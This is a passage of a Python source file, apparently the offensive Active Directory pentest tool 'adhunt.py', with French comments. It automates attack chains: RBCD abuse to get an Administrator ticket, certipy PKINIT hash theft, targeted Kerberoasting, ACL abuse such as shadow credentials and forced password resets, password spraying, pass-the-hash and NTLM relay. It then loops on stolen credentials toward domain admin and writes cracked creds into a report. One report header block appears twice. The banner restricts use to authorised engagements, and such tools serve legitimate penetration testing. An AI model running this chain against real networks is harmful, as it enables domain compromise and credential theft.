        run_cmd(["addcomputer.py", tgt, "-computer-name", fake, "-computer-pass", fpass,
                 "-dc-ip", dc] + extra, 180)
    run_cmd(["rbcd.py", tgt, "-delegate-to", target_computer, "-delegate-from", fake,
             "-action", "write", "-dc-ip", dc] + extra, 180)
    ccache = os.path.join(args.loot, f"rbcd_{tname}.ccache")
    run_cmd(["getST.py", "-spn", f"cifs/{tname}", "-impersonate", "Administrator",
             f"{args.domain}/{fake}:{fpass}", "-dc-ip", dc], 180)
    add_finding(state, "CRIT", f"RBCD execute sur {target_computer} -> ticket Administrator",
                f"KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass {tname}", target_computer)

def pkinit_from_pfx(args, state, dc, pfx):
    """certipy auth -pfx -> UnPAC-the-hash -> hash NT (ferme la chaine ADCS)."""
    if not (have("certipy") and _gate(args) and os.path.isfile(pfx)):
        return
    log(f"{C.R}{C.BD}[i] PKINIT : certipy auth -pfx {os.path.basename(pfx)}...{C.X}")
    rc, out, _ = run_cmd(["certipy", "auth", "-pfx", pfx, "-dc-ip", dc], 180)
    m = re.search(r"Got hash for '([^']+)':\s*([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", out)
    if m:
        add_cred_hash(state, m.group(1).split("@")[0].split("\\")[-1], m.group(2), "PKINIT/ADCS")

def targeted_kerberoast(args, state, dc, target):
    """GenericWrite sur un user (sans ADCS) : set fake SPN -> roast -> crack -> unset."""
    base_cmd = (f"targetedKerberoast.py -d {args.domain} -u {args.user} "
                f"--request-user {target} --dc-ip {dc}")
    if not (args.domain and _gate(args)) or not have("targetedKerberoast.py"):
        add_finding(state, "HIGH", f"Targeted Kerberoast possible sur {target}", base_cmd)
        return
    outfile = os.path.join(args.loot, f"targetroast_{target}.hashes")
    cmd = ["targetedKerberoast.py", "-d", args.domain, "-u", args.user,
           "--request-user", target, "--dc-ip", dc, "-o", outfile]
    cmd += ["-H", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    log(f"{C.R}{C.BD}[i] Targeted Kerberoast -> {target}...{C.X}")
    run_cmd(cmd, 180)
    if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
        state.setdefault("hashes", {})["kerberoast"] = outfile   # cracke par crack_hashes / --loop
        add_finding(state, "HIGH", f"Targeted Kerberoast : hash de {target} obtenu",
                    f"hashcat -m 13100 {outfile} (cracke auto en boucle)", dc)

def abuse_acl_paths(args, state, dc):
    """Weaponise les ACL abusables qu'on controle (shadow creds / RBCD / targeted roast)."""
    paths = state.get("acl_paths", [])
    if not paths:
        return
    me = (args.user or "").lower()
    log(f"\n{C.GR}[i] Exploitation de {len(paths)} chemin(s) ACL...{C.X}")
    done = set()
    for p in paths:
        frm, to, rights = p.get("from", ""), p.get("to", ""), p.get("rights", [])
        if (frm, to) in done:
            continue
        done.add((frm, to))
        strong = any(r in rights for r in ("GenericAll", "GenericWrite", "WriteDACL",
                                           "WriteOwner", "AllExtendedRights"))
        if frm.lower() != me:   # on n'exploite que ce qu'on controle
            add_finding(state, "HIGH", f"Chemin ACL : {frm} -> {'/'.join(rights)} sur {to}",
                        f"prends le controle de {frm} pour l'exploiter")
            continue
        if to.endswith("$") and strong:
            abuse_rbcd(args, state, dc, to)
        elif strong:
            abuse_shadow_credentials(args, state, dc, to)   # via ADCS/PKINIT
            targeted_kerberoast(args, state, dc, to)        # alternative sans ADCS
        elif "ForceChangePassword" in rights:
            add_finding(state, "HIGH", f"ForceChangePassword sur {to} (destructif)",
                        f"bloodyAD -u {args.user} set password {to} 'Newp@ss1!'")
        elif "Self-Membership(AddMember)" in rights:
            add_finding(state, "HIGH", f"AddMember : ajoute-toi au groupe {to}",
                        f"bloodyAD add groupMember {to} {args.user}")

# ======================================================================
# PHASE 5 : RAPPORT
# ======================================================================
SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}

# ======================================================================
# PHASE 5 : RAPPORT
# ======================================================================
SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}

def phase5_report(state, args):
    stage("PHASE 5 - RAPPORT")
    out_json = os.path.join(args.loot, "report.json")
    with open(out_json, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2, ensure_ascii=False, default=str)

    findings = sorted(state.get("findings", []), key=lambda x: SEV_ORDER.get(x["sev"], 9))
    hosts = state.get("hosts", {})
    dcs = [ip for ip, r in hosts.items() if r.get("is_dc")]
    lines = []
    lines.append(f"# adhunt - Rapport AD\n")
    lines.append(f"- Cible : `{state.get('target')}`  |  Domaine : `{state.get('domain')}`")
    lines.append(f"- Hotes AD : {len(hosts)}  |  DC : {', '.join(dcs) or 'n/a'}")
    lines.append(f"- Findings : {len(findings)}  |  Creds : {len(state.get('creds', []))}\n")

    lines.append("## Findings (par severite)\n")
    for sev in ("CRIT", "HIGH", "MED", "INFO"):
        fs = [f for f in findings if f["sev"] == sev]
        if not fs:
            continue
        lines.append(f"### {sev} ({len(fs)})")
        for f in fs:
            h = f" _(hote {f['host']})_" if f["host"] else ""
            lines.append(f"- **{f['title']}**{h}" + (f" — {f['detail']}" if f["detail"] else ""))
        lines.append("")

    intel = state.get("ldap_intel")
    if intel:
        lines.append("## Comptes remarquables\n")
        for k, label in (("kerberoastable", "Kerberoastable (SPN)"),
                         ("asreproastable", "AS-REP roastable"),
                         ("admincount", "adminCount=1 (privilegies)"),
                         ("pwd_notreqd", "PASSWD_NOTREQD"),
                         ("unconstrained", "Delegation non contrainte")):
            v = intel.get(k) or []
            if v:
                lines.append(f"- **{label}** : {', '.join(v[:20])}")
        if intel.get("desc_secrets"):
            lines.append(f"- **Descriptions suspectes** : {'; '.join(intel['desc_secrets'][:10])}")
        lines.append("")

    if state.get("creds"):
        lines.append("## Creds trouvees\n")
        for c in state["creds"]:
            lines.append(f"- `{c.get('user')}:{c.get('password') or c.get('hash')}`")
        lines.append("")

    hf = state.get("hashes", {})
    if hf:
        lines.append("## Hashes a cracker\n")
        for k, v in hf.items():
            m = "18200" if k == "asrep" else ("13100" if k == "kerberoast" else "?")
            lines.append(f"- {k} : `{v}`  ->  `hashcat -m {m} {v} rockyou.txt`")
        lines.append("")

    report = "\n".join(lines) + "\n"
    out_md = os.path.join(args.loot, "report.md")
    with open(out_md, "w", encoding="utf-8") as f:
        f.write(report)
    log(f"{C.G}[+] Rapport : {out_md}  +  {out_json}{C.X}")
    # apercu console
    ncrit = sum(1 for f in findings if f["sev"] == "CRIT")
    nhigh = sum(1 for f in findings if f["sev"] == "HIGH")
    log(f"{C.CY}{C.BD}[=] {len(findings)} finding(s) : "
        f"{C.R}{ncrit} CRIT{C.CY} / {C.R}{nhigh} HIGH{C.CY} / "
        f"{len(state.get('creds', []))} cred(s){C.X}")

# ----------------------------------------------------------------------
# Cibles : IP, CIDR, hostname, ou fichier
# ----------------------------------------------------------------------
def parse_targets(target):
    if os.path.isfile(target):
        with open(target, encoding="utf-8", errors="ignore") as f:
            items = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        out = []
        for it in items:
            out += parse_targets(it)
        return out
    try:
        net = ipaddress.ip_network(target, strict=False)
        if net.num_addresses > 1:
            return [str(h) for h in net.hosts()]
        return [str(net.network_address)]
    except ValueError:
        pass
    try:
        return [socket.gethostbyname(target)]
    except Exception:
        return [target]

# ----------------------------------------------------------------------
BANNER = f"""{C.CY}{C.BD}
  adhunt.py  -  enumeration & pentest Active Directory (A -> Z){C.X}
{C.GR}  decouverte -> non-auth -> mot de passe -> auth -> escalade -> rapport{C.X}
{C.Y}  by 12akHack{C.GR}  -  outil de securite offensive{C.X}
{C.R}  [!] Usage AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}
"""

def detect_env():
    ext = [t for t in ("nxc", "netexec", "crackmapexec", "nmap", "kerbrute",
                        "bloodhound-python", "certipy", "ldapsearch",
                        "GetNPUsers.py", "GetUserSPNs.py", "secretsdump.py",
                        "enum4linux-ng", "hashcat", "john") if have(t)]
    libs = [l for l in ("ldap3", "impacket") if have_lib(l)]
    return ext, libs

def main():
    p = argparse.ArgumentParser(
        description="adhunt.py - enumeration & pentest Active Directory de A a Z",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
------------------------------------------------------------------------
 GUIDE
------------------------------------------------------------------------
 Decouverte d'un subnet (repere les DC, signing, clock skew) :
    python adhunt.py 10.10.10.0/24

 Cible unique + enum anonyme :
    python adhunt.py 10.10.10.10 --anon

 Pipeline complet authentifie :
    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Ete2024!' --all

 Avec un hash NTLM (pass-the-hash), mode lecture seule :
    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <lm:nt> --all --safe

 /!\\ Reste STRICTEMENT dans le scope autorise de l'engagement.
------------------------------------------------------------------------
""")
    p.add_argument("target", nargs="?", help="IP, CIDR, hostname ou fichier de cibles")
    p.add_argument("-d", "--domain", help="Domaine AD (ex: corp.local) - auto-detecte sinon")
    p.add_argument("-u", "--user", help="Utilisateur")
    p.add_argument("-p", "--password", help="Mot de passe")
    p.add_argument("-H", "--hash", dest="nthash", help="Hash NTLM (LM:NT ou NT) - pass-the-hash")
    p.add_argument("-k", "--kerberos", action="store_true", help="Auth Kerberos (ticket/ccache)")
    p.add_argument("--anon", action="store_true", help="Enum non-authentifiee (phase 1)")
    p.add_argument("--spray", action="store_true", help="Password spraying (phase 2)")
    p.add_argument("--all", action="store_true", help="Toutes les phases applicables")
    p.add_argument("--safe", action="store_true", help="Lecture seule : pas de spray ni d'action active")
    p.add_argument("--yes", action="store_true", help="Confirme les actions actives (DCSync, relais, ADCS req)")
    p.add_argument("--loop", action="store_true",
                   help="Boucle : re-enum auth a chaque nouveau cred trouve/cracke (jusqu'au DA)")
    p.add_argument("--relay", action="store_true",
                   help="Tenter coercion + ntlmrelayx (actif, requiert --yes + --lhost)")
    p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
    p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1 ; ex: userlist THM)")
    p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
    p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
    p.add_argument("-t", "--threads", type=int, default=100, help="Threads scan (defaut 100)")
    p.add_argument("--timeout", type=float, default=1.2, help="Timeout port (defaut 1.2s)")
    p.add_argument("-o", "--loot", default="loot", help="Dossier de sortie (defaut loot/)")
    args = p.parse_args()

    print(BANNER)
    if not args.target:
        p.print_help(); sys.exit(0)

    ext, libs = detect_env()
    log(f"{C.GR}[i] Outils externes : {', '.join(ext) if ext else 'aucun (fallback pur-python)'}{C.X}")
    log(f"{C.GR}[i] Libs python     : {', '.join(libs) if libs else 'aucune (pip install ldap3 impacket pour +)'}{C.X}")

    targets = parse_targets(args.target)
    # dossier de sortie base sur le domaine (ou la cible)
    label = re.sub(r"[^\w.-]", "_", args.domain or args.target)
    args.loot = os.path.join(args.loot, label)
    os.makedirs(args.loot, exist_ok=True)
    global AUDIT
    AUDIT = open(os.path.join(args.loot, "audit.log"), "a", encoding="utf-8")
    audit(f"START target={args.target} domain={args.domain} user={args.user} safe={args.safe}")

    log(f"{C.GR}[i] Cibles : {len(targets)} | sortie : {args.loot}/{C.X}")
    if args.safe:
        log(f"{C.G}[i] Mode --safe : lecture seule, aucune action active.{C.X}")
    start = time.time()

    state = {"target": args.target, "domain": args.domain, "hosts": {},
             "findings": [], "users": [], "creds": [], "hashes": {}}

    # Phase 0 (toujours)
    hosts = phase0_discovery(targets, args)
    state["hosts"] = hosts
    state["domain"] = args.domain

    # Phase 1 : non-auth (si --anon/--all)
    if args.anon or args.all:
        phase1_unauth(hosts, args, state)
    # Phase 2 : spray (si --spray/--all et pas --safe)
    if (args.spray or args.all) and not args.safe:
        phase2_password(hosts, args, state)
    elif (args.spray or args.all) and args.safe:
        log(f"\n{C.Y}[i] Phase 2 (spray) ignoree en mode --safe.{C.X}")

    # Phases 3-4 : auth (creds fournies OU trouvees en phase 2), avec boucle
    authed = effective_creds(args, state)
    if args.all and authed:
        tried = set()
        for it in range(1, 4):   # max 3 iterations de boucle
            tried.add((args.user, args.password or args.nthash))
            before = len(state.get("creds", []))
            phase3_authenum(hosts, args, state)
            phase4_escalation(hosts, args, state)
            if not args.loop or len(state.get("creds", [])) == before:
                break
            # promouvoir un nouveau cred non encore essaye pour re-enumerer
            nxt = next((c for c in state["creds"]
                        if (c.get("user"), c.get("password") or c.get("hash")) not in tried), None)
            if not nxt:
                break
            args.user, args.password, args.nthash = nxt.get("user"), nxt.get("password"), nxt.get("hash")
            log(f"\n{C.CY}{C.BD}[BOUCLE] Nouveau cred -> re-enum avec {args.user} "
                f"(iteration {it+1}).{C.X}")
    elif args.all and not authed:
        log(f"\n{C.Y}[i] Phases 3-4 (auth) ignorees : pas de creds (-u/-p ou -H).{C.X}")

    # Phase 5 : rapport (toujours)
    phase5_report(state, args)

    log(f"\n{C.GR}Termine en {time.time()-start:.1f}s | loot: {args.loot}/{C.X}")
    audit("END")
    if AUDIT:
        AUDIT.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log(f"\n{C.R}[!] Interrompu.{C.X}")
